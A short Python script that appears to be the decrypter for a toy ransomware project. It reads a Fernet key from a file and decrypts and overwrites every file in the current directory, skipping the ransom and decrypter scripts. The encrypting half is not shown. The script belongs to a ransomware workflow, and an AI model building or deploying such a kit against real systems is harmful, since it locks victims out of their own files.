from operator import concat
from cryptography.fernet import Fernet
import os

files = []

for file in os.listdir():
    if file == "ransom.py" or file == "generatedkey.key" or file == "ransomdecrypter.py":
        continue
    if os.path.isfile(file):
        files.append(file)

with open("generatedkey.key","rb") as generatedkey:
    secret_Key = generatedkey.read()


for file in files:
    with open(file, "rb") as the_file:
        contents = the_file.read()
    
    contents_decrypted = Fernet(secret_Key).decrypt(contents)

    with open(file, "wb") as the_file:
        the_file.write(contents_decrypted)